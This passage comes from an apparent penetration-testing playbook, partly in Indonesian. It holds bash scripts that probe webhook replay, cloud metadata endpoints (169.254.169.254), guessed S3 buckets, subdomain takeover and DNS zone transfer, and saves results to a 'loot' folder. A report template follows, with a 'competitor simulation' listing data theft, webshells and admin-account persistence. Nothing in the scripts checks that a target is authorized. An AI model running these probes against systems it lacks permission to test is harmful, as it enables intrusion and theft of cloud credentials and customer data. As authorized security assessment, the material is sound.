    echo "  ⚠️  Webhook endpoint $wh_path responds with $ST"
    # Verify idempotency (send same request twice)
    IDEM_RESP1=$(curl -s --max-time 5 -X POST -H "Content-Type: application/json" \
      -d '{"test":true,"idempotency_key":"pentest_check"}' "$TARGET$wh_path" 2>/dev/null)
    IDEM_RESP2=$(curl -s --max-time 5 -X POST -H "Content-Type: application/json" \
      -d '{"test":true,"idempotency_key":"pentest_check"}' "$TARGET$wh_path" 2>/dev/null)
    if [ "$IDEM_RESP1" = "$IDEM_RESP2" ] && [ -n "$IDEM_RESP1" ]; then
      echo "    ⚠️  Webhook is idempotent (safe from replay)"
    else
      echo "    ❌ Webhook NOT idempotent — replay attack possible!"
      echo "[PROVIDER] Webhook replay possible at $wh_path" >> "$OUTDIR/loot/findings.txt"
    fi
  fi
done

echo "=== PROVIDER INTEGRATION SECURITY DONE ==="
```

---

### ════════════════════════════════════════════════════════
###  PHASE 6: CLOUD & INFRASTRUCTURE
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 6: CLOUD & INFRASTRUCTURE"
echo "████████████████████████████████████████████████████"

# ── Cloud Metadata SSRF (169.254.169.254) ──
echo "--- Cloud Metadata ---"
for meta_url in "http://169.254.169.254/latest/meta-data/" "http://169.254.169.254/latest/user-data/" "http://metadata.google.internal/computeMetadata/v1/"; do
  RESP=$(curl -s --max-time 3 -H "Metadata-Flavor: Google" "$meta_url" 2>/dev/null)
  [ -n "$RESP" ] && echo "🔴 [CLOUD META] $meta_url accessible: $RESP" | head -5
done

# ── S3 Bucket Enumeration ──
echo "--- S3 Bucket Discovery ---"
# Extract potential bucket names from JS/page
curl -s "$TARGET" 2>/dev/null | grep -oP '(?:s3\.amazonaws\.com/[^"'"'"'\s]+|https?://[^"'"'"'\s]*\.s3\.amazonaws\.com|https?://[^"'"'"'\s]*\.s3[.-])' | sort -u | head -20
# Bucket name guesses
for bucket in "$BASE" "$BASE-backup" "$BASE-assets" "$BASE-static" "$BASE-media" "$BASE-files" "$BASE-data" "$BASE-uploads" "$BASE-dev" "$BASE-staging" "$BASE-prod" "$BASE-logs" "$BASE-config" "$BASE-public" "$BASE-private"; do
  RESP=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "http://${bucket}.s3.amazonaws.com/" 2>/dev/null)
  [ "$RESP" = "200" ] && echo "🔴 [S3 OPEN] http://${bucket}.s3.amazonaws.com/ — public read" && \
    echo "[S3] $bucket is public" >> "$OUTDIR/loot/findings.txt"
  [ "$RESP" = "403" ] && echo "  [S3 EXISTS] http://${bucket}.s3.amazonaws.com/ (403 — exists but restricted)"
done

# ── CNAME / Subdomain Takeover ──
echo "--- Subdomain Takeover ---"
while IFS= read -r sub; do
  CNAME=$(dig +short "$sub" CNAME 2>/dev/null | head -1)
  if [ -n "$CNAME" ]; then
    RESOLVED=$(dig +short "$CNAME" A 2>/dev/null | head -1)
    [ -z "$RESOLVED" ] && echo "🔴 [TAKEOVER] $sub ($CNAME) — no A record, CNAME points to nothing!"
  fi
done < "$OUTDIR/recon/subdomains.txt" 2>/dev/null || true

# ── Open Ports Deep ──
echo "--- Interesting Open Ports ---"
grep -E '^[0-9]+/tcp' "$OUTDIR/recon/services.txt" 2>/dev/null | grep -qiE 'redis|mongo|elastic|mysql|postgres|memcached|kibana|grafana|jenkins|jupyter|docker' && \
  echo "🔴 Internal service exposed!"
grep '2375\|2376\|9200\|9300\|5601\|9090\|3000\|8080' "$OUTDIR/recon/ports-full.txt" 2>/dev/null && \
  echo "  ⚠️  Check above ports — Docker/ES/Kibana/Grafana may be exposed"

# ── DNS Zone Transfer ──
echo "--- DNS Zone Transfer ---"
for ns in $(dig "$BASE" NS +short 2>/dev/null); do
  ZT=$(dig axfr "$BASE" @"$ns" 2>/dev/null)
  echo "$ZT" | grep -qiE 'IN A|IN MX|IN TXT' && echo "🔴 [DNS AXFR] $ns allows zone transfer!" && echo "$ZT" | head -20
done

echo "=== CLOUD/INFRA DONE ==="
```

---

### ════════════════════════════════════════════════════════
###  PHASE 7: REPORT GENERATION
### ════════════════════════════════════════════════════════

Buat file laporan di:

```
$SCAN_BASE/targets/<domain>/reports/pentest-<YYYY-MM-DD-HHMM>.md
```

Format laporan:

```
╔══════════════════════════════════════════════════════════╗
║           ADVANCED PENETRATION TEST REPORT              ║
║  Target: [URL]  |  Date: [tanggal]                     ║
║  Type: Full-Scope Deep Assessment                      ║
╚══════════════════════════════════════════════════════════╝

## 🔴 CRITICAL FINDINGS

### [ID-001] — [Title] — [Endpoint]
- **Type:** SQLi / RCE / SSRF / IDOR / Auth Bypass / S3 Open / etc
- **CVE (if applicable):** CVE-XXXX-XXXXX
- **Severity:** Critical (CVSS 9.0-10.0)
- **Description:** [detailed explanation]
- **Payload:** `[exact curl/payload used]`
- **Impact:** [what attacker can achieve]
- **Proof:** [curl command to reproduce]
- **Remediation:** [specific fix]

### [ID-002] ...

## 🟡 HIGH FINDINGS
## 🟢 MEDIUM FINDINGS
## 🔵 LOW / INFO

## 📊 EXECUTIVE SUMMARY
- **Total Findings:** Critical: X | High: X | Medium: X | Low: X
- **Scope:** [target]
- **Methodology:** OWASP WSTG + custom exploit chains + competitor simulation
- **Tools Used:** nuclei, ffuf, sqlmap, dalfox, nmap, git-dumper, curl, python3

## 🔬 FINDING CATEGORIES
- **Source Code Leaks:** Git repos, backup files, config files, hardcoded secrets
- **Full Site Spider:** All pages crawled, forms extracted, endpoints discovered, hidden pages
- **Supply Chain:** SRI missing, dependency confusion, third-party risk, CSP analysis
- **CMS/CRM:** WordPress, Laravel, Odoo, Joomla, Drupal specific CVE exploitation
- **Banner/Ad/Promotion:** Malvertising, ad injection, iframe clickjacking, promo race condition, click fraud, modal injection
- **Provider Integration:** SSO/OAuth misconfig, webhook signature missing, API key exposure, webhook replay, provider portal
- **API Abuse:** GraphQL introspection, JWT attacks, mass IDOR, rate limit bypass
- **Auth Attacks:** Default creds, credential spray, OAuth misconfig, password reset
- **Data Exfiltration:** Database dumps, PII exposure, financial data, customer records
- **Persistence:** Admin creation, file upload/webshell, content manipulation
- **Cloud/Infra:** S3 buckets, metadata SSRF, subdomain takeover, DNS zone transfer

## 💀 COMPETITOR SIMULATION
Seorang kompetitor jahat dapat:
1. **Mencuri data pelanggan** (PII/finansial) untuk identity theft atau dijual
2. **Dump database** untuk credential cracking dan lateral movement
3. **Upload webshell** untuk akses jangka panjang
4. **Buat admin account** untuk persistensi
5. **Modifikasi konten** untuk reputasi damage / defacement
6. **Supply chain attack** melalui third-party JS/CSP yang lemah
7. **Malvertising** — inject malicious ads via compromised ad provider atau XSS di ad container
8. **Click fraud** — invisible ads/iframes untuk generate revenue palsu
9. **Promo abuse** — race condition pada coupon/promo untuk diskon unlimited
10. **Webhook spoofing** — kirim fake webhook tanpa signature untuk trigger aksi
11. **Social engineering** via email karyawan yang terekspos
12. **Provider API leak** — Stripe/AWS/Firebase keys dari JS untuk abuse third-party billing

## 🛠️ PRIORITIZED REMEDIATION
1. [most critical — immediate action]
2. ...
3. ...

## 📎 ATTACHMENTS
- Findings log: SCAN/targets/<domain>/loot/findings.txt
- JS analysis: SCAN/targets/<domain>/loot/js-analysis.txt
- Email lists: SCAN/targets/<domain>/loot/emails.txt
- Third-party services: SCAN/targets/<domain>/loot/third-party.txt
- Whois data: SCAN/targets/<domain>/loot/whois.txt
- Nuclei results: SCAN/targets/<domain>/recon/nuclei-*.txt
```

Sertakan semua raw findings sebagai lampiran di bagian bawah laporan.
